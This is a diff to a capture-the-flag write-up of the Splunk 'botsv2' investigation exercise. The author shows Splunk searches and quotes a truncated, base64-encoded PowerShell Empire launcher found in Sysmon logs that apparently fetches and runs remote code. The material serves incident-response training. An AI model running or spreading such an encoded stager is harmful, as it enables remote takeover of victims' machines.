@@ -795,8 +795,10 @@ C = US 	14,189 	58.981%
 
 **Q4 What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith**
 
-- Since Empire is related to powershell I started with index=botsv2 powershell, then looked into index="botsv2" powershell sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
-
+- Since Empire is related to powershell I started with: 
+```
+index=botsv2 powershell, then looked into index="botsv2" powershell sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+```
 This still results in over 50,000 events looking at interesting fields selecting 'commandline' in top 10 is oa few interesting commands, ftp.exe and powershell related. The powershell command that stands out is as follows:
 ```
 C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc WwBSAGUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAM....AQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
